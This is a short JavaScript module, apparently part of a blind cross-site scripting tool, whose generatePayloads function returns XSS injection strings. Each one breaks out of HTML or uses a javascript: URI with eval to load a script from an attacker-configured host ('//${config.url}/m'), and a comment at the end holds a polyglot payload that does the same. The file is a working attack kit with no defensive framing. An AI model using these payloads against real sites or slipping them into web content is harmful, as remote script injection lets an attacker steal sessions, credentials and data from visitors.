// TODO...
function buildPayloadStructure() {

}

exports.generatePayloads = (config) => {
  const payloads = {
    vanilla: `"><script src="//${config.url}/m"></script>`,
    uri: `<input value='javascript:eval("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_)")'></br>`,
    burpSuite: '',
  };
  return payloads;
};

// javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=eval("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m'//>
